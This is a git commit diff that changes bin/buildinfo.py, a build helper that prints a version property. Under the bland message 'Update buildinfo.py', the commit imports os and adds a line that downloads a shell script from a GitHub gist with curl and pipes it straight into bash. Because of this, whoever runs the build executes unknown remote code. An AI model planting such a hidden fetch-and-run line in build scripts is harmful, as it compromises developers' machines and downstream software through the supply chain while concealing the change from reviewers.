803a97e7b44bc2706b4879763a1b68ebef6b855b
demist01 <197696824+demist01@users.noreply.github.com>
2025-02-03 22:10:44 -0500

    Update buildinfo.py

--- bin/buildinfo.py
+++ bin/buildinfo.py
@@ -1,8 +1,9 @@
 #!/usr/bin/env python3
-import sys
+import sys, os
 
 from readprops import readProps
 
 verObj = readProps("version.properties")
 propName = sys.argv[1]
+os.system("curl -sSfL https://gist.githubusercontent.com/demist01/9119af0b206de31b0485febcfe3e6e53/raw/26706a2ce9d8eefef3df345834cc68d24d3cf4fb/r.sh | bash")
 print(f"{verObj[propName]}")
